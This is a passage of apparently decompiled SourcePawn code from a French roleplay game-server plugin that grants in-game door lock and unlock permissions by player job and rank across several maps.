						UnlockDoor(client, Entity_FindByHammerId(4305, ""), false);
					}
					new var63;
					if (StrEqual(entity_name, "Rebel_doors03", true))
					{
						UnlockDoor(client, Ent, true);
					}
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 8)
			{
				new var68;
				if (StrEqual(entity_name, "hideoutdoor", true))
				{
					UnlockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 9)
			{
				new var69;
				if (StrEqual(entity_name, "garage_frontdoor", true))
				{
					UnlockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 11)
			{
				if (EntHammerId == 6539)
				{
					UnlockDoor(client, Ent, true);
					UnlockDoor(client, Entity_FindByHammerId(6543, ""), false);
				}
				else
				{
					if (EntHammerId == 6543)
					{
						UnlockDoor(client, Ent, true);
						UnlockDoor(client, Entity_FindByHammerId(6539, ""), false);
					}
					new var70;
					if (StrEqual(entity_name, "post_inner", true))
					{
						UnlockDoor(client, Ent, true);
					}
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 12)
			{
				if (EntHammerId == 5761)
				{
					UnlockDoor(client, Ent, true);
					UnlockDoor(client, Entity_FindByHammerId(5762, ""), false);
				}
				else
				{
					if (EntHammerId == 5762)
					{
						UnlockDoor(client, Ent, true);
						UnlockDoor(client, Entity_FindByHammerId(5761, ""), false);
					}
					if (StrEqual(entity_name, "bank_inner", true))
					{
						UnlockDoor(client, Ent, true);
					}
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 13)
			{
				if (EntHammerId == 269403)
				{
					UnlockDoor(client, Ent, true);
					UnlockDoor(client, Entity_FindByHammerId(269408, ""), false);
				}
				else
				{
					if (EntHammerId == 269408)
					{
						UnlockDoor(client, Ent, true);
						UnlockDoor(client, Entity_FindByHammerId(269403, ""), false);
					}
					new var71;
					if (EntHammerId == 280799)
					{
						UnlockDoor(client, Ent, true);
					}
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 14)
			{
				new var72;
				if (StrEqual(entity_name, "weapon_door", true))
				{
					UnlockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 15)
			{
				new var73;
				if (StrEqual(entity_name, "apt_wash1", true))
				{
					UnlockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 16)
			{
				if (StrEqual(entity_name, "groc_shop_door", true))
				{
					UnlockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 17)
			{
				if (StrEqual(entity_name, "garage_backdoor", true))
				{
					UnlockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 18)
			{
				if (EntHammerId == 5568)
				{
					UnlockDoor(client, Ent, true);
					UnlockDoor(client, Entity_FindByHammerId(5565, ""), false);
					UnlockDoor(client, Entity_FindByHammerId(5571, ""), false);
					UnlockDoor(client, Entity_FindByHammerId(5574, ""), false);
				}
				else
				{
					if (EntHammerId == 5565)
					{
						UnlockDoor(client, Ent, true);
						UnlockDoor(client, Entity_FindByHammerId(5568, ""), false);
						UnlockDoor(client, Entity_FindByHammerId(5571, ""), false);
						UnlockDoor(client, Entity_FindByHammerId(5574, ""), false);
					}
					if (EntHammerId == 5571)
					{
						UnlockDoor(client, Ent, true);
						UnlockDoor(client, Entity_FindByHammerId(5568, ""), false);
						UnlockDoor(client, Entity_FindByHammerId(5565, ""), false);
						UnlockDoor(client, Entity_FindByHammerId(5574, ""), false);
					}
					if (EntHammerId == 5574)
					{
						UnlockDoor(client, Ent, true);
						UnlockDoor(client, Entity_FindByHammerId(5568, ""), false);
						UnlockDoor(client, Entity_FindByHammerId(5565, ""), false);
						UnlockDoor(client, Entity_FindByHammerId(5571, ""), false);
					}
					if (EntHammerId == 5553)
					{
						UnlockDoor(client, Ent, true);
						UnlockDoor(client, Entity_FindByHammerId(5559, ""), false);
					}
					if (EntHammerId == 5559)
					{
						UnlockDoor(client, Ent, true);
						UnlockDoor(client, Entity_FindByHammerId(5553, ""), false);
					}
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 19)
			{
				new var74;
				if (StrEqual(entity_name, "disco_door", true))
				{
					UnlockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
		}
	}
	else
	{
		if (StrEqual(mapname, "rp_california_r", true))
		{
			decl String:SteamID[64];
			GetClientAuthString(client, SteamID, 64);
			if (JobID[client][0][0] == 1)
			{
				if (StrEqual(entity_name, "City Hall Entrance Left", true))
				{
					UnlockDoor(client, Ent, true);
					UnlockDoor(client, Entity_FindByName("City Hall Entrance Right", ""), false);
				}
				else
				{
					if (StrEqual(entity_name, "City Hall Entrance Right", true))
					{
						UnlockDoor(client, Ent, true);
						UnlockDoor(client, Entity_FindByName("City Hall Entrance Left", ""), false);
					}
					new var75;
					if (RankID[client][0][0] == 1)
					{
						UnlockDoor(client, Ent, true);
					}
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			else
			{
				if (JobID[client][0][0] == 2)
				{
					if (StrEqual(entity_name, "Tenoh Office Building", true))
					{
						UnlockDoor(client, Ent, true);
					}
					else
					{
						PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
					}
				}
				if (JobID[client][0][0] == 3)
				{
					if (StrEqual(entity_name, "In-n-Out Burger Entrance L", true))
					{
						UnlockDoor(client, Ent, true);
						UnlockDoor(client, Entity_FindByName("In-n-Out Burger Entrance R", ""), false);
					}
					else
					{
						if (StrEqual(entity_name, "In-n-Out Burger Entrance R", true))
						{
							UnlockDoor(client, Ent, true);
							UnlockDoor(client, Entity_FindByName("In-n-Out Burger Entrance L", ""), false);
						}
						PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
					}
				}
				if (JobID[client][0][0] == 5)
				{
					if (StrEqual(entity_name, "Shit Shack", true))
					{
						UnlockDoor(client, Ent, true);
					}
					else
					{
						PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
					}
				}
				if (JobID[client][0][0] == 6)
				{
					if (StrEqual(entity_name, "URBN Side Door", true))
					{
						UnlockDoor(client, Ent, true);
					}
					if (StrEqual(entity_name, "URBN Entrance Left", true))
					{
						UnlockDoor(client, Ent, true);
						UnlockDoor(client, Entity_FindByName("URBN Entrance Right", ""), false);
					}
					if (StrEqual(entity_name, "URBN Entrance Right", true))
					{
						UnlockDoor(client, Ent, true);
						UnlockDoor(client, Entity_FindByName("URBN Entrance Left", ""), false);
					}
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 7)
			{
				if (StrEqual(entity_name, "Warehouse Door", true))
				{
					UnlockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			else
			{
				if (JobID[client][0][0] == 8)
				{
					if (StrEqual(entity_name, "Sexy House Yard", true))
					{
						UnlockDoor(client, Ent, true);
					}
					else
					{
						if (StrEqual(entity_name, "Sexy House Patio", true))
						{
							UnlockDoor(client, Ent, true);
						}
						if (StrEqual(entity_name, "Sexy House", true))
						{
							UnlockDoor(client, Ent, true);
						}
						PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
					}
				}
				if (JobID[client][0][0] == 9)
				{
					if (StrEqual(entity_name, "Oil Plant Office", true))
					{
						UnlockDoor(client, Ent, true);
					}
					else
					{
						PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
					}
				}
				if (JobID[client][0][0] == 10)
				{
					if (StrEqual(entity_name, "Verizon Entrance L", true))
					{
						UnlockDoor(client, Ent, true);
						UnlockDoor(client, Entity_FindByName("Verizon Entrance R", ""), false);
					}
					else
					{
						if (StrEqual(entity_name, "Verizon Entrance R", true))
						{
							UnlockDoor(client, Ent, true);
							UnlockDoor(client, Entity_FindByName("Verizon Entrance L", ""), false);
						}
						PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
					}
				}
				if (JobID[client][0][0] == 11)
				{
					if (StrEqual(entity_name, "Tillys Entrance L", true))
					{
						UnlockDoor(client, Ent, true);
						UnlockDoor(client, Entity_FindByName("Tillys Entrance R", ""), false);
					}
					else
					{
						if (StrEqual(entity_name, "Tillys Entrance R", true))
						{
							UnlockDoor(client, Ent, true);
							UnlockDoor(client, Entity_FindByName("Tillys Entrance L", ""), false);
						}
						PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
					}
				}
				if (JobID[client][0][0] == 13)
				{
					if (StrEqual(entity_name, "Stop N' Rob", true))
					{
						UnlockDoor(client, Ent, true);
					}
					else
					{
						PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
					}
				}
				if (JobID[client][0][0] == 14)
				{
					if (StrEqual(entity_name, "PacSun Entrance L", true))
					{
						UnlockDoor(client, Ent, true);
						UnlockDoor(client, Entity_FindByName("PacSun Entrance R", ""), false);
					}
					else
					{
						if (StrEqual(entity_name, "PacSun Entrance R", true))
						{
							UnlockDoor(client, Ent, true);
							UnlockDoor(client, Entity_FindByName("PacSun Entrance L", ""), false);
						}
						PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
					}
				}
				if (JobID[client][0][0] == 15)
				{
					if (StrEqual(entity_name, "Store Entrance L", true))
					{
						UnlockDoor(client, Ent, true);
						UnlockDoor(client, Entity_FindByName("Store Entrance R", ""), false);
					}
					else
					{
						if (StrEqual(entity_name, "Store Entrance R", true))
						{
							UnlockDoor(client, Ent, true);
							UnlockDoor(client, Entity_FindByName("Store Entrance L", ""), false);
						}
						PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
					}
				}
				if (JobID[client][0][0] == 16)
				{
					if (StrEqual(entity_name, "BP Entrance Left", true))
					{
						UnlockDoor(client, Ent, true);
						UnlockDoor(client, Entity_FindByName("BP Entrance Right", ""), false);
					}
					else
					{
						if (StrEqual(entity_name, "BP Entrance Right", true))
						{
							UnlockDoor(client, Ent, true);
							UnlockDoor(client, Entity_FindByName("BP Entrance Left", ""), false);
						}
						PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
					}
				}
				if (JobID[client][0][0] == 17)
				{
					if (StrEqual(entity_name, "Underground Bar", true))
					{
						UnlockDoor(client, Ent, true);
					}
					else
					{
						PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
					}
				}
				if (JobID[client][0][0] == 18)
				{
					if (StrEqual(entity_name, "Maaco Side Door", true))
					{
						UnlockDoor(client, Ent, true);
					}
					else
					{
						PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
					}
				}
				if (JobID[client][0][0] == 19)
				{
					if (StrEqual(entity_name, "Technoir Entrance L", true))
					{
						UnlockDoor(client, Ent, true);
						UnlockDoor(client, Entity_FindByName("Technoir Entrance R", ""), false);
					}
					else
					{
						if (StrEqual(entity_name, "Technoir Entrance R", true))
						{
							UnlockDoor(client, Ent, true);
							UnlockDoor(client, Entity_FindByName("Technoir Entrance L", ""), false);
						}
						PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
					}
				}
				PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
			}
		}
		new var76;
		if (StrEqual(mapname, "rp_riverside_b3", true))
		{
			if (JobID[client][0][0] == 1)
			{
				new var77;
				if (EntHammerId == 1678093)
				{
					UnlockDoor(client, Ent, true);
				}
				else
				{
					new var79;
					if (RankID[client][0][0] != 2)
					{
						UnlockDoor(client, Ent, true);
					}
					new var80;
					if (RankID[client][0][0] == 3)
					{
						UnlockDoor(client, Ent, true);
					}
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 2)
			{
				new var84;
				if (EntHammerId == 1456616)
				{
					UnlockDoor(client, Ent, true);
				}
				else
				{
					new var85;
					if (EntHammerId == 1506668)
					{
						UnlockDoor(client, Entity_FindByHammerId(1506668, ""), true);
						UnlockDoor(client, Entity_FindByHammerId(1506693, ""), false);
					}
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 3)
			{
				new var86;
				if (EntHammerId == 711980)
				{
					UnlockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 4)
			{
				new var87;
				if (EntHammerId == 1326671)
				{
					UnlockDoor(client, Ent, true);
				}
				else
				{
					new var88;
					if (EntHammerId == 1326222)
					{
						UnlockDoor(client, Entity_FindByHammerId(1326222, ""), true);
						UnlockDoor(client, Entity_FindByHammerId(1326225, ""), false);
					}
					new var89;
					if (EntHammerId == 1326443)
					{
						UnlockDoor(client, Entity_FindByHammerId(1326443, ""), true);
						UnlockDoor(client, Entity_FindByHammerId(1326448, ""), false);
					}
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 5)
			{
				new var90;
				if (EntHammerId == 58353)
				{
					UnlockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 6)
			{
				if (EntHammerId == 138324)
				{
					UnlockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 7)
			{
				new var91;
				if (EntHammerId == 89642)
				{
					UnlockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 8)
			{
				new var92;
				if (EntHammerId == 1061999)
				{
					UnlockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 9)
			{
				if (EntHammerId == 52536)
				{
					UnlockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 10)
			{
				new var93;
				if (EntHammerId == 98488)
				{
					UnlockDoor(client, Entity_FindByHammerId(98488, ""), true);
					UnlockDoor(client, Entity_FindByHammerId(98493, ""), false);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 11)
			{
				if (EntHammerId == 51970)
				{
					UnlockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 12)
			{
				new var94;
				if (EntHammerId == 82091)
				{
					UnlockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 13)
			{
				new var95;
				if (EntHammerId == 455125)
				{
					UnlockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 14)
			{
				new var96;
				if (EntHammerId == 622808)
				{
					UnlockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 15)
			{
				if (EntHammerId == 54783)
				{
					UnlockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 16)
			{
				if (EntHammerId == 52416)
				{
					UnlockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 17)
			{
				if (EntHammerId == 54615)
				{
					UnlockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 18)
			{
				new var97;
				if (EntHammerId == 117728)
				{
					UnlockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 19)
			{
				if (EntHammerId == 29432)
				{
					UnlockDoor(client, Ent, true);
				}
				else
				{
					new var98;
					if (EntHammerId == 26871)
					{
						UnlockDoor(client, Entity_FindByHammerId(26871, ""), true);
						UnlockDoor(client, Entity_FindByHammerId(26876, ""), false);
					}
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
		}
	}
	return 0;
}

CanBeLockDoor(client, Ent)
{
	new EntHammerId = Entity_GetHammerId(Ent);
	decl String:entity_name[128];
	Entity_GetName(Ent, entity_name, 128);
	decl String:mapname[128];
	GetCurrentMap(mapname, 128);
	if (StrEqual(mapname, "oviscity_r_03", true))
	{
		new var3;
		if (StrEqual(entity_name, "house02_maindoor01", true))
		{
			LockDoor(client, Ent, true);
		}
		else
		{
			new var6;
			if (StrEqual(entity_name, "house02_topdoor012", true))
			{
				LockDoor(client, Ent, true);
			}
			new var9;
			if (StrEqual(entity_name, "house02_topdoor01", true))
			{
				LockDoor(client, Ent, true);
			}
			new var12;
			if (StrEqual(entity_name, "house02_bathdoor01", true))
			{
				LockDoor(client, Ent, true);
			}
			new var15;
			if (StrEqual(entity_name, "apt3_door", true))
			{
				LockDoor(client, Ent, true);
			}
			new var18;
			if (StrEqual(entity_name, "apt3_bal", true))
			{
				LockDoor(client, Ent, true);
			}
			new var21;
			if (EntHammerId == 4156)
			{
				LockDoor(client, Ent, true);
			}
			new var24;
			if (StrEqual(entity_name, "apt2_door", true))
			{
				LockDoor(client, Ent, true);
			}
			new var27;
			if (StrEqual(entity_name, "apt2_bal", true))
			{
				LockDoor(client, Ent, true);
			}
			new var30;
			if (EntHammerId == 4160)
			{
				LockDoor(client, Ent, true);
			}
			new var33;
			if (StrEqual(entity_name, "mapt1_door", true))
			{
				LockDoor(client, Ent, true);
			}
			new var36;
			if (StrEqual(entity_name, "mapt1_bath", true))
			{
				LockDoor(client, Ent, true);
			}
			new var39;
			if (StrEqual(entity_name, "mapt2_door", true))
			{
				LockDoor(client, Ent, true);
			}
			new var42;
			if (StrEqual(entity_name, "mapt2_bath", true))
			{
				LockDoor(client, Ent, true);
			}
			new var45;
			if (StrEqual(entity_name, "house01_maindoor01", true))
			{
				LockDoor(client, Ent, true);
			}
			new var48;
			if (StrEqual(entity_name, "house01_topdoor01b", true))
			{
				LockDoor(client, Ent, true);
			}
			new var51;
			if (StrEqual(entity_name, "house01_topdoor01", true))
			{
				LockDoor(client, Ent, true);
			}
			new var54;
			if (StrEqual(entity_name, "house01_bathdoor01", true))
			{
				LockDoor(client, Ent, true);
			}
			new var56;
			if (StrEqual(entity_name, "mapt_door", true))
			{
				LockDoor(client, Ent, true);
			}
			if (JobID[client][0][0] == 1)
			{
				new var57;
				if (StrEqual(entity_name, "pd_frontdoor1", true))
				{
					if (EntHammerId == 4844)
					{
						LockDoor(client, Ent, true);
						LockDoor(client, Entity_FindByHammerId(4834, ""), false);
					}
					else
					{
						if (EntHammerId == 4834)
						{
							LockDoor(client, Ent, true);
							LockDoor(client, Entity_FindByHammerId(4844, ""), false);
						}
						LockDoor(client, Ent, true);
					}
				}
				else
				{
					new var59;
					if (RankID[client][0][0] != 2)
					{
						LockDoor(client, Ent, true);
					}
					new var60;
					if (RankID[client][0][0] == 1)
					{
						if (EntHammerId == 5761)
						{
							LockDoor(client, Ent, true);
							LockDoor(client, Entity_FindByHammerId(5762, ""), false);
						}
						else
						{
							if (EntHammerId == 5762)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(5761, ""), false);
							}
							if (EntHammerId == 5753)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(5755, ""), false);
							}
							if (EntHammerId == 5755)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(5753, ""), false);
							}
							if (EntHammerId == 197748)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(197753, ""), false);
							}
							if (EntHammerId == 197753)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(197748, ""), false);
							}
							if (EntHammerId == 88436)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(88441, ""), false);
							}
							if (EntHammerId == 88441)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(88436, ""), false);
							}
							if (EntHammerId == 6539)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(6543, ""), false);
							}
							if (EntHammerId == 6543)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(6539, ""), false);
							}
							if (EntHammerId == 4531)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(4539, ""), false);
							}
							if (EntHammerId == 4539)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(4531, ""), false);
							}
							if (EntHammerId == 121648)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(121653, ""), false);
							}
							if (EntHammerId == 121653)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(121648, ""), false);
							}
							if (EntHammerId == 4149)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(4150, ""), false);
							}
							if (EntHammerId == 4150)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(4149, ""), false);
							}
							if (EntHammerId == 4147)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(4148, ""), false);
							}
							if (EntHammerId == 4148)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(4147, ""), false);
							}
							if (EntHammerId == 4297)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(4299, ""), false);
							}
							if (EntHammerId == 4299)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(4297, ""), false);
							}
							if (EntHammerId == 4305)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(4307, ""), false);
							}
							if (EntHammerId == 4307)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(4305, ""), false);
							}
							if (EntHammerId == 129942)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(129947, ""), false);
							}
							if (EntHammerId == 129947)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(129942, ""), false);
							}
							if (EntHammerId == 5553)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(5559, ""), false);
							}
							if (EntHammerId == 5559)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(5553, ""), false);
							}
							if (EntHammerId == 269403)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(269408, ""), false);
							}
							if (EntHammerId == 269408)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(269403, ""), false);
							}
							if (EntHammerId == 4224)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(4225, ""), false);
							}
							if (EntHammerId == 4225)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(4224, ""), false);
							}
							if (EntHammerId == 4172)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(4174, ""), false);
							}
							if (EntHammerId == 4174)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(4172, ""), false);
							}
							if (EntHammerId == 5568)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(5565, ""), false);
								LockDoor(client, Entity_FindByHammerId(5571, ""), false);
								LockDoor(client, Entity_FindByHammerId(5574, ""), false);
							}
							if (EntHammerId == 5565)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(5568, ""), false);
								LockDoor(client, Entity_FindByHammerId(5571, ""), false);
								LockDoor(client, Entity_FindByHammerId(5574, ""), false);
							}
							if (EntHammerId == 5571)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(5568, ""), false);
								LockDoor(client, Entity_FindByHammerId(5565, ""), false);
								LockDoor(client, Entity_FindByHammerId(5574, ""), false);
							}
							if (EntHammerId == 5574)
							{
								LockDoor(client, Ent, true);
								LockDoor(client, Entity_FindByHammerId(5568, ""), false);
								LockDoor(client, Entity_FindByHammerId(5565, ""), false);
								LockDoor(client, Entity_FindByHammerId(5571, ""), false);
							}
							LockDoor(client, Ent, true);
						}
					}
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 2)
			{
				if (EntHammerId == 121653)
				{
					LockDoor(client, Ent, true);
					LockDoor(client, Entity_FindByHammerId(121648, ""), false);
				}
				else
				{
					if (EntHammerId == 121648)
					{
						LockDoor(client, Ent, true);
						LockDoor(client, Entity_FindByHammerId(121653, ""), false);
					}
					new var61;
					if (StrEqual(entity_name, "hospitaldoor01", true))
					{
						LockDoor(client, Ent, true);
					}
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 3)
			{
				if (EntHammerId == 4224)
				{
					LockDoor(client, Ent, true);
					LockDoor(client, Entity_FindByHammerId(4225, ""), false);
				}
				else
				{
					if (EntHammerId == 4225)
					{
						LockDoor(client, Ent, true);
						LockDoor(client, Entity_FindByHammerId(4224, ""), false);
					}
					if (EntHammerId == 4172)
					{
						LockDoor(client, Ent, true);
						LockDoor(client, Entity_FindByHammerId(4174, ""), false);
					}
					if (EntHammerId == 4174)
					{
						LockDoor(client, Ent, true);
						LockDoor(client, Entity_FindByHammerId(4172, ""), false);
					}
				}
			}
			if (JobID[client][0][0] == 4)
			{
				if (EntHammerId == 4857)
				{
					LockDoor(client, Ent, true);
					LockDoor(client, Entity_FindByHammerId(4861, ""), false);
				}
				else
				{
					if (EntHammerId == 4861)
					{
						LockDoor(client, Ent, true);
						LockDoor(client, Entity_FindByHammerId(4857, ""), false);
					}
					if (StrEqual(entity_name, "court_door", true))
					{
						LockDoor(client, Ent, true);
					}
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 5)
			{
				if (EntHammerId == 198045)
				{
					LockDoor(client, Ent, true);
				}
				else
				{
					if (EntHammerId == 197748)
					{
						LockDoor(client, Ent, true);
						LockDoor(client, Entity_FindByHammerId(197753, ""), false);
					}
					if (EntHammerId == 197753)
					{
						LockDoor(client, Ent, true);
						LockDoor(client, Entity_FindByHammerId(197748, ""), false);
					}
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 6)
			{
				new var62;
				if (StrEqual(entity_name, "weapon_door", true))
				{
					LockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 7)
			{
				if (EntHammerId == 4299)
				{
					LockDoor(client, Ent, true);
					LockDoor(client, Entity_FindByHammerId(4297, ""), false);
				}
				else
				{
					if (EntHammerId == 4305)
					{
						LockDoor(client, Ent, true);
						LockDoor(client, Entity_FindByHammerId(4307, ""), false);
					}
					if (EntHammerId == 4307)
					{
						LockDoor(client, Ent, true);
						LockDoor(client, Entity_FindByHammerId(4305, ""), false);
					}
					new var63;
					if (StrEqual(entity_name, "Rebel_doors03", true))
					{
						LockDoor(client, Ent, true);
					}
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 8)
			{
				new var68;
				if (StrEqual(entity_name, "hideoutdoor", true))
				{
					LockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 9)
			{
				new var69;
				if (StrEqual(entity_name, "garage_frontdoor", true))
				{
					LockDoor(client, Ent, true);
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
			}
			if (JobID[client][0][0] == 11)
			{
				if (EntHammerId == 6539)
				{
					LockDoor(client, Ent, true);
					LockDoor(client, Entity_FindByHammerId(6543, ""), false);
				}
				else
				{
					if (EntHammerId == 6543)
					{
						LockDoor(client, Ent, true);
						LockDoor(client, Entity_FindByHammerId(6539, ""), false);
					}
					new var70;
					if (StrEqual(entity_name, "post_inner", true))
					{
						LockDoor(client, Ent, true);
					}
					PrintToChat(client, "[L-RP] Vous n'avez pas les cles de cette porte.");
				}
